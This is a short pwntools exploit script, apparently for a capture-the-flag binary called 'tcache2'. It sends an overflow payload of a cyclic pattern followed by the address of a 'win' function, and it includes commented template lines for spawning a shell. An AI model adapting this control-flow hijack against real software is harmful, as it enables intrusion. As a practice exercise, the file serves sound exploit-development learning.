#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template tcache2
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('tcache2')

context.terminal = ["tmux", "splitw", "-v"]
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
break 0x00400ffd
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

payload = cyclic(240)
payload += p64(exe.symbols["win"])

io.recvuntil(b"act?")
io.sendline(b"blah")

io.recvuntil(b"be?")
io.sendline(b"128")

io.recvuntil(b"us:")
io.sendline(payload)

io.recvuntil(b"Action:")
io.interactive()
#io.recvuntil(b"Action: ")
#io.sendline(b"1")

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
